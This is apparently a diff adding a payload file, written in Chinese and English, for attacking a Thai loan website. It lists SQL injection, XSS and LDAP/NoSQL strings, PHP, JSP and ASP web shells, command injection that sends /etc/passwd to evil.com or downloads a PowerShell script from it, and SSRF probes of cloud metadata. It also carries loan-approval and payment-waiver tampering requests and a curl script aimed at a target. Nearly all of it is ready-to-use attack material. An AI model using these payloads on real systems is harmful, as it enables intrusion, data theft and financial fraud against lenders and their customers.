@@ -1,0 +1,313 @@
+# 泰国贷款网站Web安全测试载荷集合
+# Thai Loan Website Web Security Testing Payloads
+
+# ======================
+# SQL注入载荷 (SQL Injection Payloads)
+# ======================
+
+# 基础SQL注入测试
+' OR '1'='1
+' OR 'x'='x
+admin'--
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# Union查询
+' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT 1,database(),version(),4--
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
+
+# 时间盲注
+'; WAITFOR DELAY '00:00:05'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%password%')>0--
+
+# 布尔盲注
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+# 泰语字符绕过
+' OR '1'='1' -- 'ไทย
+' UNION SELECT 'ทดสอบ',password,username FROM users--
+' AND (SELECT COUNT(*) FROM ผู้ใช้) > 0--
+
+# 编码绕过
+%27%20OR%271%27%3D%271
+0x27204f52202731273d2731
+CHAR(39)+OR+CHAR(39)+CHAR(50)+CHAR(61)+CHAR(50)+CHAR(39)
+
+# ======================
+# XSS载荷 (XSS Payloads)
+# ======================
+
+# 基础XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+
+# 泰语XSS
+<script>alert('ทดสอบ XSS')</script>
+<img src=x onerror=alert('ช่องโหว่ XSS')>
+<svg onload=alert('โจมตี XSS')>
+
+# 绕过过滤器
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<video><source onerror="alert('XSS')">
+
+# 存储型XSS
+<script src=//evil.com/xss.js></script>
+<body onload=alert('Stored XSS')>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+
+# ======================
+# 文件上传载荷 (File Upload Payloads)
+# ======================
+
+# PHP WebShell
+<?php system($_GET['cmd']); ?>
+<?php @eval($_POST['x']); ?>
+<?php passthru($_GET['c']); ?>
+<?=`$_GET[cmd]`?>
+
+# PHP绕过
+test.php5
+test.phtml
+test.php7
+test.php.txt
+test.php.jpeg
+
+# JSP WebShell
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+}
+%>
+
+# ASP WebShell
+<%eval request("cmd")%>
+<%execute request("cmd")%>
+
+# 双重扩展名
+test.php.jpg
+test.jsp.png
+test.asp.gif
+
+# ======================
+# 命令注入载荷 (Command Injection Payloads)
+# ======================
+
+# Linux命令注入
+; ls -la
+| whoami
+&& cat /etc/passwd
+; curl http://evil.com/steal.php?data=$(cat /etc/passwd)
+
+# Windows命令注入
+& dir
+| net user
+&& type c:\windows\system32\drivers\etc\hosts
+; powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
+
+# 泰语环境测试
+; ls -la /home/thai
+| cat /var/log/thai-app.log
+&& whoami | grep thai
+
+# ======================
+# 业务逻辑测试载荷 (Business Logic Payloads)
+# ======================
+
+# 贷款金额操纵
+{
+  "loan_amount": 999999999,
+  "interest_rate": -0.01,
+  "user_type": "admin",
+  "bypass_limit": true,
+  "force_approve": true
+}
+
+# 利率计算绕过
+{
+  "principal": 10000,
+  "rate": 0.001,  # 极低利率
+  "term": 1,      # 极短期
+  "payment_type": "interest_only"
+}
+
+# 信用评分篡改
+{
+  "user_id": 12345,
+  "credit_score": 999,
+  "risk_level": "none",
+  "approval_status": "pre_approved"
+}
+
+# 支付绕过
+{
+  "payment_amount": 0,
+  "payment_method": "waived",
+  "waiver_code": "ADMIN_BYPASS",
+  "transaction_id": "FAKE_TXN_123"
+}
+
+# ======================
+# API测试载荷 (API Testing Payloads)
+# ======================
+
+# 未授权访问
+GET /api/v1/users/all
+GET /api/v1/loans/pending
+GET /api/v1/admin/dashboard
+
+# 参数篡改
+GET /api/v1/loan/123?user_id=456
+POST /api/v1/loan/approve
+{
+  "loan_id": 123,
+  "approver_role": "admin",
+  "force_approve": true
+}
+
+# 批量操作
+POST /api/v1/loans/bulk-approve
+{
+  "loan_ids": [1,2,3,4,5,6,7,8,9,10],
+  "auto_approve": true
+}
+
+# ======================
+# 泰语特定测试 (Thai Language Specific Tests)
+# ======================
+
+# 泰语字符注入
+ทดสอบ' OR '1'='1
+รหัสผ่าน'--
+ชื่อผู้ใช้' UNION SELECT password FROM users--
+
+# 泰铢符号测试
+฿0
+฿-1000
+฿999999999
+
+# 泰语SQL注入
+' OR '1'='1' WHERE 'ทดสอบ'='ทดสอบ'--
+' UNION SELECT 'ชื่อ',รหัสผ่าน FROM ผู้ใช้--
+
+# 泰语XSS
+<script>alert('การโจมตี XSS')</script>
+<img src=x onerror=alert('ช่องโหว่')>
+
+# ======================
+# 头部注入载荷 (Header Injection Payloads)
+# ======================
+
+# Host头部注入
+Host: evil.com
+Host: target.com@evil.com
+
+# User-Agent注入
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: <?php system($_GET['cmd']); ?>
+
+# Referer注入
+Referer: https://evil.com/phish
+Referer: javascript:alert('XSS')
+
+# ======================
+# SSRF载荷 (SSRF Payloads)
+# ======================
+
+# 本地文件读取
+http://localhost/etc/passwd
+http://127.0.0.1/etc/hosts
+file:///etc/passwd
+
+# 云服务元数据
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+
+# 内网探测
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+
+# ======================
+# LDAP注入载荷 (LDAP Injection Payloads)
+# ======================
+
+# LDAP登录绕过
+*)(&
+*))(uid=*
+*)(|(objectClass=*)
+*))%00
+
+# LDAP查询注入
+*)(|(cn=*
+*)(|(password=*
+*))(|(cn=*
+
+# ======================
+# NoSQL注入载荷 (NoSQL Injection Payloads)
+# ======================
+
+# MongoDB注入
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "return true"}
+
+# Redis注入
+test\r\nset admin 1\r\n
+test\r\nconfig get *\r\n
+test\r\nflushall\r\n
+
+# ======================
+# 测试用例模板 (Test Case Template)
+# ======================
+
+# SQL注入测试用例
+测试ID: SQLI-001
+测试目标: 登录表单
+测试载荷: ' OR '1'='1--
+预期结果: 绕过身份验证
+风险等级: 高危
+
+# XSS测试用例
+测试ID: XSS-001
+测试目标: 搜索功能
+测试载荷: <script>alert('XSS')</script>
+预期结果: 弹出警告框
+风险等级: 中危
+
+# 文件上传测试用例
+测试ID: UPLOAD-001
+测试目标: 文件上传功能
+测试载荷: test.php5
+预期结果: WebShell上传成功
+风险等级: 高危
+
+# ======================
+# 自动化测试脚本 (Automation Script)
+# ======================
+
+# 使用curl进行批量测试
+#!/bin/bash
+TARGET="https://target.com"
+
+# SQL注入测试
+curl -X POST "$TARGET/login" -d "username=admin'--&password=test"
+
+# XSS测试
+curl -X GET "$TARGET/search?q=<script>alert('XSS')</script>"
+
+# 文件上传测试
+curl -X POST "$TARGET/upload" -F "file=@test.php5"
